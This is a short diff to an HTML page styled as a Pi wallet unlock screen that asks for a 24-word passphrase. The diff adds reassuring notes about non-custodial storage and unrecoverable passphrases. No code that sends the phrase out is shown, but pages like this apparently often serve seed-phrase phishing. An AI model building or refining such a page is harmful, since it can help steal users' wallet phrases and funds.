@@ -148,7 +148,14 @@ passphrase here" required></textarea>
   <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
   <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
 </form>
+    <p class="note">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+    </p>
 
+    <p class="note">
+      Lost your passphrase? <a class="inline-link" onclick="window.location.href='index.html'">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+    </p>
+  </div>
 <!-- Error message box (already in your page) -->
 <div id="error-msg" class="error-box" style="display:none;">
   Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
@@ -190,3 +197,4 @@ passphrase here" required></textarea>
 </script>
 </body>
 </html>
+
